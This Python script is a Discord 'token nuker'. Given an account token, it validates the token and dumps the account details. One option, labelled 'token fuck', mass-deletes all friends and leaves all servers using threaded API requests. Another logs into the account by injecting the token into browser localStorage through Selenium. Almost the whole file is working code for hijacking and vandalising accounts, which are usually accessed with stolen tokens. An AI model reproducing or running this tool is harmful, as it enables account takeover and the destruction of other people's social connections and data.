# credit: https://github.com/fweak for 50% of recode

import requests
import platform
import os
import time
import threading
import json

from selenium import webdriver
from colorama import init, Fore
init(convert=True)

CHROME_DRIVER_PATH = 'chromedriver.exe'

class Jajaja:
    def __init__(self, token: str, thread_count: str):
        self.threads = list()
        self.thread_count = int(thread_count)
        self.headers = {
            'authorization': token,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
        }


    @staticmethod
    def replace_all(query: str, what: list, _with: list):
        for x in range(0, len(_with)):
            to_with = _with[x]
            to_what = what[x]

            if to_what in query:
                query = query.replace(to_what, to_with)
        return query


    @staticmethod
    def clear_console():
        if platform.system() == 'Windows':
            os.system('cls')
        else:
            os.system('clear')

    @staticmethod
    def ask(query: str):
        print(query, end='')
        return input(': ')

    @staticmethod
    def ratelimit(self, status:int, body:str):
        try:
            if status == 429:
                data = json.loads(body)
                print(f'[Jajaja] -> Discord Ratelimit :: {data["retry_after"]}')
                time.sleep(body["retry_after"])
                pass
        except:
            pass

    # Start of methods
    def get_all_guilds(self) -> list:
        servers = list()
        request = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=self.headers)

        for server in request.json():
            servers.append(server['id'])

        return servers

    def get_all_friends(self) -> list:
        friends = list()
        request = requests.get('https://discord.com/api/v6/users/@me/relationships', headers=self.headers)

        for friend in request.json():
            friends.append(friend['id'])

        return friends

    def remove_friends(self, friend_id: str):
        request = requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend_id}', headers=self.headers)

        self.ratelimit(status=request.status_code, body=request.json())

        return

    def remove_servers(self, server_id: str):
        request = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{server_id}', headers=self.headers)

        self.ratelimit(status=request.status_code, body=request.json())
        print(request.json())
        input()
        return True

    def token_login(self):
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('detach', True)
        driver = webdriver.Chrome(CHROME_DRIVER_PATH, options=opts)
        script = '''
            const login = (token) => {
                setInterval(() => document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`, 50);
                setTimeout(() => location.reload(), 2500);
            };''' + f'login("{self.token}")'

        driver.get('https://discord.com/login')
        driver.execute_script(script)

    def token_info(self):
        for key, value in self.user.items():
            print(f'{Fore.YELLOW}{key}{Fore.RESET}:', value)
        input('press Enter to go back')

    def check_token(self) -> bool:
        request = requests.get('https://discord.com/api/v8/users/@me', headers=self.headers)

        if request.status_code == 200:
            self.user = request.json()
            return True
        else:
            return False

    def thread_requests(self, command: str):
        if command == '1':
            friends = self.get_all_friends()
            servers = self.get_all_guilds()

            for friend in friends:
                if threading.active_count() < self.thread_count:
                    thread = threading.Thread(target=self.remove_friends, args=(friend,))
                    thread.start()
                    thread.join()

            for server in servers:
                if threading.active_count() < self.thread_count:
                    thread = threading.Thread(target=self.remove_servers, args=(server,))
                    thread.start()
                    thread.join()

        elif command == '2':
            self.token_login()
        elif command == '3':
            self.token_info()
        else:
            exit()

    def display_banner(self):
        return self.replace_all(f'''
               (      )  (      )  (      )
               )\  ( /(  )\  ( /(  )\  ( /(
              ((_) )(_))((_) )(_))((_) )(_))
                ! ((_)_   ! ((_)_   ! ((_)_
               | |/ _` | | |/ _` | | |/ _` |
              _/ |\__,_|_/ |\__,_|_/ |\__,_|
             |__/      |__/      |__/

            {Fore.YELLOW}════════════════════════════════════{Fore.RESET}
        ''', [')', '('], [f'{Fore.YELLOW}){Fore.RESET}', f'{Fore.RED}({Fore.RESET}'])

    def input_loop(self):
        self.clear_console()

        print(self.display_banner() + f'''
            [{Fore.YELLOW}1{Fore.RESET}] token fuck
            [{Fore.YELLOW}2{Fore.RESET}] token login
            [{Fore.YELLOW}3{Fore.RESET}] token info
            [{Fore.YELLOW}4{Fore.RESET}] exit
        ''')
        cmd = input('> ')

        self.clear_console()

        if cmd in ['1', '2', '3', '4']:
            self.thread_requests(command=cmd)
            return self.input_loop()
        else:
            return self.input_loop()

if __name__ == '__main__':
    token = Jajaja.ask(f'[{Fore.YELLOW}>{Fore.RESET}] Enter Token')
    threads = Jajaja.ask(f'[{Fore.YELLOW}>{Fore.RESET}] Enter Threads')

    client = Jajaja(token, threads)
    if not client.check_token():
        print(f'[{Fore.YELLOW}!{Fore.RESET}] Invalid token input.')
    else:
        client.input_loop()

    input('\nPress ENTER to exit...\n')
